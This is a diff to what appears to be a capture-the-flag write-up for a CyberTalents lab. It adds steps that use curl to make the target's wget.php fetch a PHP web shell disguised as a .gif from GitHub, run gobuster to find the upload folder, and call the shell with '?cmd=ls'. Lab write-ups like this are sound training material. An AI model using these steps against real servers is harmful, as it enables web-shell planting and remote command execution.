@@ -89,7 +89,25 @@ The filename needs to be constructed very precisely:
     POST Data: url=https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif
 
    - $ curl -X POST -d "url="https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif" cybertalent.com/wget.php 
+   
+   Response:
+   http://cdcamxwl32pue3e6m5p6v471txvg1g23gg7kkc834-web.cybertalentslabs.com/wget.php
+   <h3 style="position:relative;max-width:500px;margin:450px auto;font-size:50px">check </br> /var/www/html/f2up/images/</br> maybe your file uploaded</h3>
 
 
+8- we need to know where we the file stored?
+   $ gobuster dir -u http://TARGET_URL/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_results.txt
+   $ gobuster dir -u http://cdcamxwl32pue3e6m5p6v471txvg1g23gg7kkc834-web.cybertalentslabs.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_results.txt
 
-8- visit to the following 
+   Response:
+   /.htpasswd            (Status: 403) [Size: 331]
+   /.htaccess            (Status: 403) [Size: 331]
+   /.hta                 (Status: 403) [Size: 331]
+   /images               (Status: 301) [Size: 421] [--> http://cdcamxwl32pue3e6m5p6v471txvg1g23gg7kkc834-web.cybertalentslabs.com/images/]
+   /index.html           (Status: 200) [Size: 1834]
+
+
+9- visit to the following 
+   http://cdcamxwl32pue3e6m5p6v471txvg1g23gg7kkc834-web.cybertalentslabs.com/images/Ax232.php?cmd=ls
+
+
